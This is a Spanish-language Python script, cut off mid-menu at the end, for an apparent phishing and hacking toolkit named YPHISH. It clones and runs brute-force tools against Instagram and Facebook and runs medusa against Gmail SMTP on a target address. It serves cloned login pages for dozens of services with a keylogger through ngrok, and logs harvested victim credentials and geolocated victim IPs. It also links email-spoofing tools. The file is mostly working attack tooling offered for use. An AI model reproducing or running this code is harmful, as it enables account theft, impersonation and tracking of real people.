#!/usr/bin/env python 
# -*- coding: utf-8 -*-

BLUE, RED, WHITE, CYAN, DEFAULT, YELLOW, MAGENTA, GREEN, END, BOLD = '\33[94m', '\033[91m', '\33[97m', '\033[36m', '\033[0m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[1m'

import multiprocessing
import sys
import os 
import subprocess
import time
from subprocess import check_output
from sys import stdout, exit, argv  
sys.path.insert(0,"lib")
sys.path.insert(0,"..")
sys.dont_write_bytecode = True
#from network import run_network
sys.dont_write_bytecode = True
from distutils.dir_util import copy_tree
from urllib.request import urlopen, quote, unquote
from platform import system as systemos, architecture
from wget import download
import re
import json
import webbrowser


Green="\033[1;33m"
Blue="\033[1;34m"
Grey="\033[1;30m"
Reset="\033[0m"
Red="\033[1;31m"

def check(host='http://google.com'): #Viendo si el usuario posee conexion a internet
    try:
        urlopen(host)
        print(""+Green+"Usted posee conexion a Internet,puede continuar")
    except:
        print("No posee conexion a internet,no puede ejecutar la herramienta")
        exit(0)

def banner():
    print(" "+ Grey + "_____________________________________________")
    print(" |  " +Blue  +"__   __  ___   _  _   ___   ___   _  _   "+ Grey +"|")
    print(" |  " +Blue  +"\ \ / / | _ \ | || | |_ _| / __| | || |  "+ Grey +"|")
    print(" |  " +Blue  +" \ V /  |  _/ | __ |  | |  \__ \ | __ |  "+ Grey +"|")
    print(" |  " +Blue  +"  |_|   |_|   |_||_| |___| |___/ |_||_|  "+ Grey +"|")
    print(" |"+"                                           "+"|")
    print(" |"+Blue+""+Blue+"                                         "+Grey+"  |")
    print(" |"+ Grey +"___________________________________________|")


def menu():
	print(""+Grey+ "    ||----------------------------------------------------------------------------------||")	
	print(""+Grey+ "    ||                                      "+Blue+"MENU"+Grey+"                                        ||")
	print(""+Grey+ "    ||----------------------------------------------------------------------------------||")
	print(""+Grey+ "    ||                                        |                                         ||")
	print(""+Grey+ "    ||      [1]"+Green+"Phishing "+Grey+"                      |      [4]"+Green+"Email Spoofing"+Grey+"                  ||")
	print(""+Grey+ "    ||                                        |                                         ||")
	print(""+Grey+ "    ||      [2]"+Green+"Reconocimiento"+Grey+"                 |      [5]"+Green+"Fuerza Bruta "+Grey+"                   ||")
	print(""+Grey+ "    ||                                        |                                         ||")
	print(""+Grey+ "    ||      [3]"+Green+"Creador de Wordlist"+Grey+"            |      [6]"+Green+"Salir"+Grey+"                           ||")
	print(""+Grey+ "    ||                                        |                                         ||")
	print(""+Grey+ "    ||                                        |                                         ||")
	print(""+Grey+ "    ||----------------------------------------------------------------------------------||")

def opciones():
    opc = input("Que elige:")
    if opc == "1":
        time.sleep(0.5)
        os.system("clear")
        phish()
    elif opc == "2":
        time.sleep(0.5)
        os.system("clear")
        rec()
    elif opc == "3":
        time.sleep(0.5)
        os.system("clear")
        word()
    elif opc == "4":
        time.sleep(0.5)
        os.system("clear")
        correo()
    elif opc == "5":
        time.sleep(0.5)
        os.system("clear")
        fuerzabruta()
    elif opc == "6":
        time.sleep(0.5)
        os.system("clear")
        exit(0)
#Reconocimiento
def rec():
        print(""+Grey+ "||----------------------------------------------------------------------------------||")	
        print(""+Grey+ "||                                  "+Blue+"Reconocimiento"+Grey+"                                  ||")
        print(""+Grey+ "||----------------------------------------------------------------------------------||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "|| [1]"+Green+"FBI "+Grey+"                                |      [5]"+Green+"osrframework  "+Grey+"                  ||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "|| [2]"+Green+"Infoga"+Grey+"                              |      [6]"+Green+"InfoG "+Grey+"                          ||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "|| [3]"+Green+"EO-Ripper"+Grey+"                           |      [7]"+Green+"ReconDog"+Grey+"                        ||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "|| [4]"+Green+"UserRecon"+Grey+"                           |      [8]"+Green+"Regresar al menu"+Grey+"                ||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "||----------------------------------------------------------------------------------||")
        print("Estas Herramientas se instalaran en el directorio tools/Reconocimiento")    
        print("Que Herramienta elige:")    
        tool = input("[+]")
        if tool == "1":
            FBI()
        elif tool == "2":
            Infoga()
        elif tool == "3":
            EmailOsint()
        elif tool == "4":
            UserRecon()
        elif tool == "5":
            osrframework()
        elif tool == "6":
            InfoG()
        elif tool == "7":
            ReconDog()
        elif tool == "8":
            os.system("clear")
            time.sleep(1)
            menu()
            opciones()
#Wordlist
def word():
        print(""+Grey+ "||----------------------------------------------------------------------------------||")	
        print(""+Grey+ "||                                     "+Blue+"Wordlist"+Grey+"                                     ||")
        print(""+Grey+ "||----------------------------------------------------------------------------------||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "|| [1]"+Green+"Elpscrk "+Grey+"                            |     [3]"+Green+"Regresar al menu"+Grey+"                 ||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "|| [2]"+Green+"Cupp "+Grey+"                               |     "+Green+""+Grey+"                                    ||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "||----------------------------------------------------------------------------------||") 
        print("Estas Herramientas se instalaran en el directorio tools/Wordlist")    
        print("Que Herramienta elige:")    
        tool = input("[+]")
        if tool == "1":
            elpscrk()
        elif tool == "2":
            Cupp()
        elif tool == "3":
            os.system("cls")
            time.sleep(1)
            menu()
            opciones()

#Email spoofing
def correo():
        print(""+Grey+ "||----------------------------------------------------------------------------------||")	
        print(""+Grey+ "||                                     "+Blue+"Email Spoofing"+Grey+"                               ||")
        print(""+Grey+ "||----------------------------------------------------------------------------------||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "|| [1]"+Green+"Script de Email Spoofing"+Grey+"            |     [3]"+Green+"Regresar al menu"+Grey+"                 ||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "|| [2]"+Green+"Pagina de Email Spoofing"+Grey+"            |     "+Green+""+Grey+"                                    ||")
        print(""+Grey+ "||                                        |                                         ||")
        print(""+Grey+ "||----------------------------------------------------------------------------------||") 
        print("Estas Herramientas se instalaran en el directorio tools/Spoofing")    
        print("Que opcion elige:")    
        tool = input("[+]")
        if tool == "1":
            correospoofing()
        elif tool == "2":
            pagina()
        elif tool == "3":
            os.system("cls")
            time.sleep(1)
            menu()
            opciones()
#Fuerza bruta
def fuerzabruta():
    print(""+Grey+ "||----------------------------------------------------------------------------------||")	
    print(""+Grey+ "||                                  "+Blue+"Fuerza Bruta"+Grey+"                                    ||")
    print(""+Grey+ "||----------------------------------------------------------------------------------||")
    print(""+Grey+ "||                                        |                                         ||")
    print(""+Grey+ "|| [1]"+Green+"Instagram"+Grey+"                           |     [3]"+Green+"Gmail"+Grey+"                            ||")
    print(""+Grey+ "||                                        |                                         ||")
    print(""+Grey+ "|| [2]"+Green+"Facebook "+Grey+"                           |     [4]"+Green+"Regresar al menu"+Grey+"                 ||")
    print(""+Grey+ "||                                        |                                         ||")
    print(""+Grey+ "||----------------------------------------------------------------------------------||") 
    print("Estas Herramientas se instalaran en el directorio tools/BruteForce")    
    print("Que opcion elige:")    
    tool = input("[+]")
    if tool == "1":
        instagram()
    elif tool == "2":
        facebook()
    elif tool == "3":
        gmail()
    elif tool == "4":
        os.system("cls")
        time.sleep(1)
        menu()
        opciones()

#Tools 
#Reconocimiento      
def Infoga():
	location = os.getcwd()
	if not os.path.isdir('tools/Reconocimiento/Infoga'):
		print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
		time.sleep(4)
		os.system('cd tools && cd Reconocimiento && git clone https://github.com/m4ll0k/Infoga.git && cd Infoga && python setup.py install')
		print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/Reconocimiento/Infoga".format(GREEN, DEFAULT, location)))
		if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
			os.system('clear')
			menu() , opciones()
		else:
			os.system('cd tools && cd Reconocimiento && cd Infoga && python infoga.py')	
	else:
		print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
		time.sleep(2)
		input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
		os.system('clear')
		banner(), menu() , opciones()	

def FBI():
	location = os.getcwd()
	if not os.path.isdir('tools/Reconocimiento/FBI'):
		print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
		time.sleep(4)
		os.system('cd tools && cd Reconocimiento && git clone https://github.com/LulzsecHackz/FBI.git && cd FBI && pip2 install -r requirements.txt')
		print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/Reconocimiento/FBI".format(GREEN, DEFAULT, location)))
		if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
			os.system('clear')
			menu() , opciones()
		else:
			os.system('cd tools && cd Reconocimiento && cd FBI && python2 FBI.py')	
	else:
		print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
		time.sleep(2)
		input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
		os.system('clear')
		banner(), menu() , opciones()

def EmailOsint():
	location = os.getcwd()
	if not os.path.isdir('tools/Reconocimiento/email-osint-ripper'):
		print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
		time.sleep(4)
		os.system('cd tools && cd Reconocimiento && git clone https://github.com/Quantika14/email-osint-ripper.git && cd FBI && pip3 install -r requirements.txt')
		print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/Reconocimiento/email-osint-ripper".format(GREEN, DEFAULT, location)))
		if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
			os.system('clear')
			menu() , opciones()
		else:
			os.system('cd tools && cd Reconocimiento && cd email-osint-ripper && python3 eo-ripper.py')	
	else:
		print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
		time.sleep(2)
		input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
		os.system('clear')
		banner(), menu() , opciones()
#Este
def UserRecon():
    location = os.getcwd()
    if not os.path.isdir('tools/Reconocimiento/userrecon'):
        print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
        time.sleep(4)
        os.system('cd tools && cd Reconocimiento && git clone https://github.com/issamelferkh/userrecon.git')
        print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/Reconocimiento/userrecon".format(GREEN, DEFAULT, location)))
        if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
            os.system('clear')
            menu() , opciones()
        else:
            os.system('cd tools && cd Reconocimiento && cd userrecon && bash userrecon.sh')	
    else:
        print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
        time.sleep(2)
        input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
        os.system('clear')
        banner(), menu() , opciones()

def osrframework():
    if not os.path.isdir('tools/Reconocimiento/osrframework'):
        print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
        os.system("pip3 install osrframework && pip3 install osrframework --upgrade")
        print(("\n{0}[✔] Hecho.{1}\nHerramienta descargada,no se guardo en ningun directorio\nPor lo tanto puedes ejecutarla de cualquier lugar".format(GREEN, DEFAULT)))
        if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
            os.system('clear')
            menu() , opciones()
        else:
            os.system('osrf --help')	
    else:
        print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
        time.sleep(2)
        input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
        os.system('clear')
        banner(), menu() , opciones()

def ReconDog():
	location = os.getcwd()
	if not os.path.isdir('tools/Reconocimiento/ReconDog'):
		print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
		time.sleep(4)
		os.system('cd tools && cd Reconocimiento && git clone https://github.com/s0md3v/ReconDog.git && cd ReconDog && pip install -r requirements.txt')
		print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/Reconocimiento/ReconDog".format(GREEN, DEFAULT, location)))
		if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
			os.system('clear')
			menu() , opciones()
		else:
			os.system('cd tools && cd Reconocimiento && cd ReconDog && ./dog')	
	else:
		print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
		time.sleep(2)
		input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
		os.system('clear')
		banner(), menu() , opciones()

def InfoG():
	location = os.getcwd()
	if not os.path.isdir('tools/Reconocimiento/InfoG'):
		print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
		time.sleep(4)
		os.system('cd tools && cd Reconocimiento && git clone git clone https://github.com/haijuga7/InfoG && cd InfoG && pip2 install requests')
		print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/Reconocimiento/InfoG".format(GREEN, DEFAULT, location)))
		if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
			os.system('clear')
			menu() , opciones()
		else:
			os.system('cd tools && cd Reconocimiento && cd InfoG && python2 infog.py')	
	else:
		print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
		time.sleep(2)
		input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
		os.system('clear')
		banner(), menu() , opciones()

#Wordlist
def Cupp():
	location = os.getcwd()
	if not os.path.isdir('tools/Wordlist/cupp'):
		print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
		time.sleep(4)
		os.system('cd tools && cd Wordlist && git clone https://github.com/Mebus/cupp.git && cd cupp')
		print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/Reconocimiento/email-osint-ripper".format(GREEN, DEFAULT, location)))
		if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
			os.system('clear')
			menu() , opciones()
		else:
			os.system('cd tools && cd Wordlist && cd cupp && python3 cupp.py -h')	
	else:
		print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
		time.sleep(2)
		input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
		os.system('clear')
		banner(), menu() , opciones()

def elpscrk():
	location = os.getcwd()
	if not os.path.isdir('tools/Wordlist/elpscrk'):
		print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
		time.sleep(4)
		os.system('cd tools && cd Wordlist && git clone https://github.com/D4Vinci/elpscrk.git && cd cupp')
		print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/Reconocimiento/elpscrk".format(GREEN, DEFAULT, location)))
		if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
			os.system('clear')
			menu() , opciones()
		else:
			os.system('cd tools && cd Wordlist && cd elpscrk && python elpscrk.py')	
	else:
		print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
		time.sleep(2)
		input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
		os.system('clear')
		banner(), menu() , opciones()

#Spoofing 
def pagina():
    webbrowser.open("http://emailspoofbyharris.000webhostapp.com/index.html", new=2, autoraise=True)

def correospoofing():
	location = os.getcwd()
	if not os.path.isdir('tools/Spoofing/CorreoFake'):
		print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
		time.sleep(4)
		os.system('cd tools && cd Spoofing && git clone https://github.com/b4rc0d37/CorreoFake.git && cd CorreoFake')
		print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/Spoofing/CorreoFake".format(GREEN, DEFAULT, location)))
		if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
			os.system('clear')
			menu() , opciones()
		else:
			os.system('cd tools && cd Spoofing && cd CorreoFake && bash correosfake.sh')	
	else:
		print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
		time.sleep(2)
		input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
		os.system('clear')
		banner(), menu() , opciones()
#Brute force
def instagram():
    print(""+Grey+ "||----------------------------------------------------------------------------------||")	
    print(""+Grey+ "||                                    "+Blue+"Instagram"+Grey+"                                     ||")
    print(""+Grey+ "||----------------------------------------------------------------------------------||")
    print(""+Grey+ "||                                        |                                         ||")
    print(""+Grey+ "|| [1]"+Green+"InstaShell"+Grey+"                          |     [3]"+Green+"InstaBrute"+Grey+"                       ||")
    print(""+Grey+ "||                                        |                                         ||")
    print(""+Grey+ "|| [2]"+Green+"Instagram"+Grey+"                           |     [4]"+Green+"Regresar al menu"+Grey+"                 ||")
    print(""+Grey+ "||                                        |                                         ||")
    print(""+Grey+ "||----------------------------------------------------------------------------------||") 
    print("Estas Herramientas se instalaran en el directorio tools/BruteForce")    
    print("Que opcion elige:")    
    tool = input("[+]")
    if tool == "1":
        instashell()
    elif tool == "2":
        insta()
    elif tool == "3":
        instabrute()
    elif tool == "4":
        os.system("cls")
        time.sleep(1)
        fuerzabruta()
def facebook():
    location = os.getcwd()
    if not os.path.isdir('tools/BruteForce/b4r-brute'):
        print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
        time.sleep(4)
        os.system('cd tools && cd BruteForce && git clone https://github.com/b4rc0d37/b4r-brute.git && cd b4r-brute && pip3 install mechanize')
        print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/BruteForce/b4r-brute".format(GREEN, DEFAULT, location)))
        if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
            os.system('clear')
            menu() , opciones()
        else:
            os.system('cd tools && cd BruteForce && cd b4r-brute && python b4r-brute.py')	
    else:
        print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
        time.sleep(2)
        input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
        os.system('clear')
        banner(), menu() , opciones()

def gmail():
    print("Inserte el email a atacar")
    correo = str(input("--> "))
    print("Inserte la wordlist")
    wordlist = str(input("--> "))
    ataque = os.system(f"medusa -h smtp.gmail.com -u {correo} -P {wordlist} -M smtp")
    print(ataque)

#Tools Instagram BruteForce
def instashell():
    location = os.getcwd()
    if not os.path.isdir('tools/BruteForce/Instashell'):
        print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
        time.sleep(4)
        os.system('cd tools && cd BruteForce && git clone https://github.com/manuHACK3R/Instashell.git && cd Instashell && chmod +x install.sh && chmod +x instashell.sh && ./install.sh')
        print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/BruteForce/Instashell".format(GREEN, DEFAULT, location)))
        if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
            os.system('clear')
            menu() , opciones()
        else:
            os.system('cd tools && cd BruteForce && cd Instashell && service tor start && ./instashell.sh')	
    else:
        print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
        time.sleep(2)
        input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
        os.system('clear')
        banner(), menu() , opciones()

def insta():
    location = os.getcwd()
    if not os.path.isdir('tools/BruteForce/Instagram'):
        print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
        time.sleep(4)
        os.system('cd tools && cd BruteForce && git clone https://github.com/Pure-L0G1C/Instagram.git && cd Instagram && pip3 install -r requirements.txt')
        print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/BruteForce/Instagram".format(GREEN, DEFAULT, location)))
        if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
            os.system('clear')
            menu() , opciones()
        else:
            os.system('cd tools && cd BruteForce && cd Instagram && python3 instagram.py -h')	
    else:
        print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
        time.sleep(2)
        input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
        os.system('clear')
        banner(), menu() , opciones()

def instabrute():
    location = os.getcwd()
    if not os.path.isdir('tools/BruteForce/InstaBrute'):
        print(("\n{0}[*] Descargando la herramienta...{1}".format(GREEN, DEFAULT)))
        time.sleep(4)
        os.system('cd tools && cd BruteForce && git clone https://github.com/Ha3MrX/InstaBrute.git && cd InstaBrute && chmod +x insta.sh')
        print(("\n{0}[✔] Hecho.{1}\nHerramienta guardada en {2}/tools/BruteForce/InstaBrute".format(GREEN, DEFAULT, location)))
        if input("\n{0}[!] ¿Desea ejecutarla? (y/n)\n{1}Elección >>{2} ".format(GREEN, RED, DEFAULT)).upper() != "Y":
            os.system('clear')
            menu() , opciones()
        else:
            os.system('cd tools && cd BruteForce && cd InstaBrute && service tor start && ./insta.sh')	
    else:
        print(("\n{}[X] Esta herramienta ya existe...".format(RED)))
        time.sleep(2)
        input("\n{}Presione cualquier tecla para continuar...".format(GREEN))
        os.system('clear')
        banner(), menu() , opciones()
#Phish
os.path.exists
def phish():
    checkNgrok()
    runPEnv()
    def custom(): #Question where user can input custom web-link
        print(Green+"\n [+] A que pagina quieres que rediriga a la persona luego del ataque:")
        custom = input(Green+"\n [+] Eleccion > ")
        if 'http://' or 'https://' in custom:
            pass
        else:
            custom = 'http://' + custom
        if os.path.exists('Server/www/post.php') and os.path.exists('Server/www/login.php'):
            with open('Server/www/login.php') as f:
                read_data = f.read()
            c = read_data.replace('<CUSTOM>', custom)
            f = open('Server/www/login.php', 'w')
            f.write(c)
            f.close()
            with open('Server/www/post.php') as f:
                read_data = f.read()
            c = read_data.replace('<CUSTOM>', custom)
            f = open('Server/www/post.php', 'w')
            f.write(c)
            f.close()
        else:
            with open('Server/www/login.php') as f:
                read_data = f.read()
            c = read_data.replace('<CUSTOM>', custom)
            f = open('Server/www/login.php', 'w')
            f.write(c)
            f.close()
    custom()
    #Correr Servidor NGROK 
    runNgrok()
    
    multiprocessing.Process(target=runServer).start()
    waitCreds()

#checkeando si se tiene instalado el ngrok
def checkNgrok(): 
    if os.path.isfile('Server/ngrok') == False:
        print('[+] Descargando Ngrok...')
        if "Android" in str(check_output(("uname", "-a"))):
        #if "Android" in str(subprocess.check_output(("uname", "-a"))):
            filename = 'ngrok-stable-linux-arm.zip'
        else:
            ostype = systemos().lower()
            if architecture()[0] == '64bit':
                filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
            else:
                filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        os.system('unzip ' + filename)
        os.system('mv ngrok Server/ngrok')
        os.system('rm -Rf ' + filename)
        os.system('clear')

def end(): 
    os.system('clear')
    print ("Hasta luego")

def loadModule(module):
       print(Green+"Creando sitio...")

#Menu de seleccion de las paginas de phishing
def runPhishing(page, option2): 
    os.system("rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/")
    if page == 'Facebook':
        copy_tree("WebPages/fb_standard/", "Server/www/")
    elif page == 'Google':
        copy_tree("WebPages/google_standard/", "Server/www/")
    elif page == 'LinkedIn':
        copy_tree("WebPages/linkedin/", "Server/www/")
    elif page == 'GitHub':
        copy_tree("WebPages/GitHub/", "Server/www/")
    elif page == 'StackOverflow':
        copy_tree("WebPages/stackoverflow/", "Server/www/")
    elif page == 'WordPress':
        copy_tree("WebPages/wordpress/", "Server/www/")
    elif page == 'Twitter':
        copy_tree("WebPages/twitter/", "Server/www/")
    elif page == 'Snapchat':
        copy_tree("WebPages/Snapchat_web/", "Server/www/")
    elif page == 'Yahoo':
        copy_tree("WebPages/yahoo_web/", "Server/www/")
    elif page == 'Twitch':
        copy_tree("WebPages/twitch/", "Server/www/")
    elif page == 'Microsoft':
        copy_tree("WebPages/live_web/", "Server/www/")
    elif page == 'Steam':
        copy_tree("WebPages/steam/", "Server/www/")
    elif page == 'iCloud':
        copy_tree("WebPages/iCloud/", "Server/www/")
    elif page == 'Instagram':
        copy_tree("WebPages/Instagram_web/", "Server/www/")
    elif page == 'VK':
        copy_tree("WebPages/VK/", "Server/www/")
    elif page == 'GitLab':
        copy_tree("WebPages/gitlab/", "Server/www/")
    elif page == 'NetFlix':
        copy_tree("WebPages/netflix/", "Server/www/")
    elif page == 'Origin':
        copy_tree("WebPages/origin/", "Server/www/")
    elif page == 'Pinterest':
        copy_tree("WebPages/pinterest/", "Server/www/")
    elif page == 'ProtonMail':
        copy_tree("WebPages/protonmail/", "Server/www/")
    elif page == 'Spotify':
        copy_tree("WebPages/spotify/", "Server/www/")
    elif page == 'Quora':
        copy_tree("WebPages/quora/", "Server/www/")
    elif page == 'PornHub':
        copy_tree("WebPages/pornhub/", "Server/www/")
    elif page == 'Adobe':
        copy_tree("WebPages/adobe/", "Server/www/")
    elif page == 'Badoo':
        copy_tree("WebPages/badoo/", "Server/www/")
    elif page == 'CryptoCurrency':
        copy_tree("WebPages/cryptocurrency/", "Server/www/")
    elif page == 'DevianArt':
        copy_tree("WebPages/devianart/", "Server/www/")
    elif page == 'DropBox':
        copy_tree("WebPages/dropbox/", "Server/www/")
    elif page == 'eBay':
        copy_tree("WebPages/ebay/", "Server/www/")
    elif page == 'Myspace':
        copy_tree("WebPages/myspace/", "Server/www/")
    elif page == 'PayPal':
        copy_tree("WebPages/paypal/", "Server/www/")
    elif page == 'Shopify':
        copy_tree("WebPages/shopify/", "Server/www/")
    elif page == 'Verizon':
        copy_tree("WebPages/verizon/", "Server/www/")
    elif page == 'Yandex':
        copy_tree("WebPages/yandex/", "Server/www/")
    elif page == 'Reddit':
        copy_tree("WebPages/Reddit/", "Server/www/")
    elif page == 'Subitoit':
        copy_tree("WebPages/subitoit/", "Server/www/")
    elif page == 'PlayStation':
        copy_tree('WebPages/playstation/', "Server/www/")
    elif page == 'Xbox':
        copy_tree('WebPages/xbox/', "Server/www/")

didBackground = True
logFile = None
for arg in argv:
    if arg=="--nolog": #If true - don't log
        didBackground = False
if didBackground:
    logFile = open("log.txt", "w")


def log(ctx): #Writing log
    if didBackground: #if didBackground == True, write
        logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(GREEN, "").replace(DEFAULT, "") + "\n")
    print(ctx)


def waitCreds():
    print(""+Green+"[+] Empezando Hackeo... ")
    print(""+Green+"[+] Esperando por informacion... \n")
    while True:
        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log('======================================================================'.format(RED, DEFAULT))
                log(' {0}[ CREDENCIALES ENCONTRADAS ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                os.system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                log('======================================================================'.format(RED, DEFAULT))
        creds.close()


        with open('Server/www/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                ip = re.match('IP PUBLICA DE LA VICTIMA: (.*?)\n', lines)
                resp = urlopen('https://ipinfo.io/json')
                ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                if 'bogon' in ipinfo:
                    log('======================================================================'.format(RED, DEFAULT))
                    log(' \n{0}[ IP VICTIMA ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                else:
                    matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                    latitude = matchObj.group(1)
                    longitude = matchObj.group(2)
                    log('======================================================================'.format(RED, DEFAULT))
                    log(' \n{0}[ INFORMACION DE LA VICTIMA ENCONTRADA ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                    log(' \n{0}Longitud: %s \nLatitud: %s{1}'.format(GREEN, DEFAULT) % (longitude, latitude))
                    log(' \n{0}ISP: %s \nPais: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['org'], ipinfo['country']))
                    log(' \n{0}Provincia/Estado: %s \nCiudad: %s{1}'.format(GREEN, DEFAULT) % (ipinfo['region'], ipinfo['city']))
                os.system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                log('======================================================================'.format(RED, DEFAULT))
        creds.close()


def runPEnv(): #menu 
    os.system('clear')
    print (Blue+"No uses esta herramienta para el mal".format(GREEN, DEFAULT, CYAN))
    for i in range(101):
        time.sleep(0.01)
        stdout.write("\r [+] Preparando todo... %d%%" % i)
        stdout.flush()

    print ("\n\n[+] Chekeando si tienes PHP ... ".format(CYAN, DEFAULT))
    if 256 != os.system('which php'): 
        print (" --{0}>{1} OK.".format(CYAN, DEFAULT))
    else:
        print (" --> NO TIENES INSTALADO PHP: \n {0}*{1} Por favor instala PHP y corre el script de vuelta")
        exit(0)
    print(Blue +"""          1 Facebook         13-Steam         25-Badoo              37-PlayStation
          2-Google           14-VK            26-CryptoCurrency     38-Xbox
          3-LinkedIn         15-iCloud        27-DevianArt
          4-GitHub           16-GitLab        28-DropBox        
          5-StackOverflow    17-Netflix       29-eBay
          6-WordPress        18-Origin        30-MySpace
          7-Twitter          19-Pinterest     31-PayPal
          8-Instagram        20-ProtonMail    32-Shopify
          9-Snapchat         21-Spotify       33-Verizon
          10-Yahoo           22-Quora         34-Yandex
